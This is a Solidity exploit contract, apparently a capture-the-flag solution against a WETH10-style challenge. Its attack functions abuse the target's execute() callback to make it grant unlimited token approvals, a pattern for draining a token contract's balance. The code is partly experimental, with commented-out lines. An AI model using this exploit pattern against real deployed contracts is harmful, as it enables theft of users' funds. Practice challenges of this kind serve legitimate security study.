// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IChallenge {
    function execute(
        address receiver,
        uint256 amount,
        bytes calldata data
    ) external;

    function approve(address spender, uint256 amount) external;

    function deposit() external payable;
}

contract Bob {
    address payable immutable bob;
    IChallenge immutable challenge;
    event Ammount(uint256 indexed ammount);
    address immutable challengeaddress;
    mapping(address => uint256) balance;

    constructor(address _bob, address _addr) {
        bob = payable(_bob);
        challenge = IChallenge(_addr);
        challengeaddress = _addr;
    }

    function deposit() external payable {
        balance[msg.sender] = 1 ether;
    }

    function loan(uint256 amount) external payable {
        challenge.approve(address(challenge), type(uint256).max);
        // bob.transfer(1 ether);
        emit Ammount(amount);
        selfdestruct(payable(challengeaddress));
    }

    function attack() external payable {
        uint256 amount = 1 ether;

        bytes memory data1 = abi.encodeWithSignature("loan(uint256)", amount);

        challenge.execute(address(this), amount, data1);
    }

    function attack2() external payable {
        // we approve all the token balance of contract WETH10 to bobs address
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(0),
            type(uint256).max
        );

        challenge.execute(address(challenge), 0, data);
    }
}

// contract Attacker {

// function attack(address _boob ,address _weth ) external {
// Bob attacker = new Bob(_boob , _weth);

// }

// }